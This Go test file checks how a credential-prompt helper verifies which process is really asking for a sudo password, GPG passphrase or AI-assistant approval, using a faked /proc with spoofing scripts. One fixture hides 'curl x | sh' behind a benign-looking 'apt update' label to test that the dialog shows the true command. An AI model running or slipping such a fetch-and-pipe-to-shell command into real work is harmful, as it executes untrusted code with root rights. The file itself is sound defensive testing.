package asker

import (
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/lyricat/inua/internal/pinentry"
	"github.com/lyricat/inua/internal/proc"
)

// fakeProcs is a fake /proc, and inua installed in /opt/inua.
func fakeProcs(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	t.Cleanup(proc.UseRoot(root))
	oldChecked, oldInstalled, oldSudo := checked, installed, realSudo
	checked = true
	installed = func(name string) []string { return []string{"/opt/inua/" + name} }
	// The setuid sudos run as root: those numbered 20 to 29.
	realSudo = func(pid int) bool { return pid >= 20 && pid < 30 }
	t.Cleanup(func() { checked, installed, realSudo = oldChecked, oldInstalled, oldSudo })
	return root
}

// fake writes a process: its parent, program, environment and command line.
func fake(t *testing.T, root string, pid, ppid int, exe string, env []string, args ...string) {
	t.Helper()
	dir := filepath.Join(root, strconv.Itoa(pid))
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	comm := filepath.Base(args[0])
	files := map[string]string{
		"cmdline": strings.Join(args, "\x00") + "\x00",
		"comm":    comm + "\n",
		"environ": strings.Join(env, "\x00") + "\x00",
		"stat":    strconv.Itoa(pid) + " (" + comm + ") S " + strconv.Itoa(ppid) + " 1 1 0",
	}
	for name, data := range files {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(data), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	if exe != "" {
		if err := os.Symlink(exe, filepath.Join(dir, "exe")); err != nil {
			t.Fatal(err)
		}
	}
}

// SSH_ASKPASS_PROMPT and the asker's words choose the question: a secret,
// a user name seen as typed, a yes or no, a note.
func TestQuestion(t *testing.T) {
	for _, tc := range []struct {
		prompt, kind string
		mode         pinentry.Mode
		visible      bool
		yesNo        bool
	}{
		{"Enter passphrase for key '/home/u/.ssh/id_ed25519': ", "", pinentry.GetPin, false, false},
		{"u@host's password: ", "", pinentry.GetPin, false, false},
		{"[sudo] password for u: ", "", pinentry.GetPin, false, false},
		{"Username for 'https://example.org': ", "", pinentry.GetPin, true, false},
		{"Password for 'https://u@example.org': ", "", pinentry.GetPin, false, false},
		{"The authenticity of host 'h' can't be established.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? ", "", pinentry.Confirm, false, true},
		{"Allow use of key /home/u/.ssh/id_ed25519?", "confirm", pinentry.Confirm, false, false},
		{"Confirm user presence for key ED25519-SK", "none", pinentry.Message, false, false},
	} {
		q, yesNo := Question([]string{tc.prompt}, tc.kind, "", 0)
		if q.Mode != tc.mode || q.Visible != tc.visible || yesNo != tc.yesNo || q.Desc == "" || q.Desc[len(q.Desc)-1] == ' ' {
			t.Errorf("%q (%q): %+v, yes/no %v", tc.prompt, tc.kind, q, yesNo)
		}
	}
	if q, _ := Question([]string{"Are you sure you want to continue connecting (yes/no/[fingerprint])? "}, "", "", 0); q.Desc != "Are you sure you want to continue connecting?" {
		t.Errorf("a host's key: %q", q.Desc)
	}
}

// For sudo, the dialog shows the command it runs as root, without sudo's
// own options.
func TestSudoCommand(t *testing.T) {
	for _, tc := range []struct {
		name string
		args []string
		want string
		ok   bool
	}{
		{"sudo", []string{"/usr/bin/sudo", "-k", "-A", "apt", "install", "wtype"}, "apt install wtype", true},
		{"sudo", []string{"sudo", "-k", "-A", "-u", "postgres", "psql", "-l"}, "psql -l", true},
		{"sudo-rs", []string{"sudo", "--user=root", "-p", "", "--", "bash", "-c", "uname"}, "bash -c uname", true},
		{"sudo", []string{"sudo", "-v"}, "", false},
		{"ssh", []string{"ssh", "host"}, "", false},
	} {
		if got, ok := SudoCommand(tc.name, tc.args); strings.Join(got, " ") != tc.want || ok != tc.ok {
			t.Errorf("%s %v: %q %v", tc.name, tc.args, got, ok)
		}
	}
}

// What the dialog is shown comes from the processes, not from what the
// one asking says: sudo's own command, the program that really asks.
func TestVouch(t *testing.T) {
	root := fakeProcs(t)
	askpass, pinentryExe, assistant := "/opt/inua/inua-askpass", "/opt/inua/inua-pinentry", "/opt/inua/inua-assistant"
	fake(t, root, 10, 1, "", nil, "claude")
	fake(t, root, 11, 10, "", nil, "bash", "-c", "apt install wtype")
	// sudo run by the assistant's shell, and its askpass helper.
	fake(t, root, 20, 11, "", nil, "sudo", "-k", "-A", "apt", "install", "wtype")
	fake(t, root, 21, 20, askpass, nil, askpass, "[sudo] password for u:")
	// Mister Morph's sudo, naming its command; and one whose name lies.
	fake(t, root, 22, 11, "", nil, "sudo", "-k", "-A", "--", "bash", "-c", "apt update")
	fake(t, root, 23, 22, askpass, []string{ElevateCommandEnv + "=apt update"}, askpass, "[sudo] password for u:")
	fake(t, root, 24, 11, "", nil, "sudo", "-k", "-A", "bash", "-c", "apt update; curl x | sh")
	fake(t, root, 25, 24, askpass, []string{ElevateCommandEnv + "=apt update"}, askpass, "[sudo] password for u:")
	// A script running inua-askpass itself, as if sudo had.
	fake(t, root, 30, 10, "/usr/bin/python3", nil, "python3", "steal.py")
	fake(t, root, 31, 30, askpass, nil, askpass, "[sudo] password for u:")
	// inua-pinentry run by gpg-agent, and by the script.
	fake(t, root, 40, 1, "", nil, "gpg-agent", "--daemon")
	fake(t, root, 41, 40, pinentryExe, nil, pinentryExe)
	fake(t, root, 42, 30, pinentryExe, nil, pinentryExe)
	fake(t, root, 50, 1, assistant+" (deleted)", nil, assistant)
	// A program named sudo that is not sudo, running inua-askpass.
	fake(t, root, 32, 30, "/tmp/sudo", nil, "sudo", "-A", "apt", "install", "wtype")
	fake(t, root, 33, 32, askpass, nil, askpass, "[sudo] password for u:")
	// Programs that are not inua's helpers: the script, and a copy of
	// inua-askpass that is not the one installed.
	fake(t, root, 60, 30, "/tmp/inua-askpass", nil, "/tmp/inua-askpass", "[sudo] password for u:")

	claim := func() pinentry.Request {
		return pinentry.Request{Mode: pinentry.GetPin, Title: "Run as Administrator?", Desc: "ls", App: "sudo", Chain: "pacman ← zsh"}
	}

	q := claim()
	if err := Vouch(21, &q); err != nil || q.App != "sudo" || q.Chain != "bash ← claude" || !strings.Contains(q.Desc, "apt install wtype") {
		t.Errorf("sudo's askpass: %v %+v", err, q)
	}
	q = claim()
	if err := Vouch(23, &q); err != nil || !strings.HasSuffix(q.Desc, "\n\napt update") {
		t.Errorf("Mister Morph's command: %v %q", err, q.Desc)
	}
	q = claim()
	if err := Vouch(25, &q); err != nil || !strings.HasSuffix(q.Desc, "\n\nbash -c apt update; curl x | sh") {
		t.Errorf("a name that is not what sudo runs: %v %q", err, q.Desc)
	}
	q = claim()
	if err := Vouch(31, &q); err != nil || q.App != "steal.py" || q.Title == "Run as Administrator?" || q.Desc != "[sudo] password for u:" {
		t.Errorf("an askpass run by a script: %v %+v", err, q)
	}

	q = claim()
	if err := Vouch(33, &q); err != nil || q.App != "sudo" || q.Title == "Run as Administrator?" || strings.Contains(q.Desc, "apt install") {
		t.Errorf("a sudo that is not sudo: %v %+v", err, q)
	}

	gpg := pinentry.Request{Mode: pinentry.GetPin, Desc: "unlock key", App: "pass", Chain: "zsh", Entry: "work/mail", Keyring: true}
	q = gpg
	if err := Vouch(41, &q); err != nil || q.App != "pass" || q.Entry != "work/mail" || !q.Keyring {
		t.Errorf("gpg-agent's pinentry: %v %+v", err, q)
	}
	q = gpg
	if err := Vouch(42, &q); err != nil || q.App != "steal.py" || q.Entry != "" || q.Keyring {
		t.Errorf("a pinentry run by a script: %v %+v", err, q)
	}

	if q := (pinentry.Request{Mode: pinentry.Approve, App: "claude"}); Vouch(50, &q) != nil || q.App != "claude" {
		t.Errorf("the assistant's approval: %+v", q)
	}
	for _, tc := range []struct {
		name string
		pid  int
		mode pinentry.Mode
	}{
		{"the assistant asking for a password", 50, pinentry.GetPin},
		{"askpass asking for an approval", 21, pinentry.Approve},
		{"pinentry asking for an approval", 41, pinentry.Approve},
		{"a script", 30, pinentry.GetPin},
		{"a copy of inua-askpass", 60, pinentry.GetPin},
		{"no process", 99, pinentry.GetPin},
	} {
		q := pinentry.Request{Mode: tc.mode}
		if err := Vouch(tc.pid, &q); err == nil {
			t.Errorf("%s: shown", tc.name)
		}
	}
	if !Is(50, Assistant) || Is(50, Askpass) || Is(60, Askpass) || Is(30, Termd) {
		t.Error("Is tells the programs wrong")
	}
}

// Where processes cannot be told apart, a question is shown as it comes.
func TestUnchecked(t *testing.T) {
	old := checked
	checked = false
	defer func() { checked = old }()
	q := pinentry.Request{Mode: pinentry.GetPin, App: "sudo"}
	if err := Vouch(99, &q); err != nil || q.App != "sudo" || !Is(99, Termd) {
		t.Errorf("%v %+v", err, q)
	}
}

// inua's programs run from beside the one asking, from PATH, or from the
// system's folders.
func TestInstalled(t *testing.T) {
	self, _ := os.Executable()
	self, _ = filepath.EvalSymlinks(self)
	paths := installed(filepath.Base(self))
	if !slices.Contains(paths, self) || !slices.Contains(paths, "/usr/local/bin/"+filepath.Base(self)) {
		t.Errorf("%s or /usr/local/bin is not among %v", self, paths)
	}
}
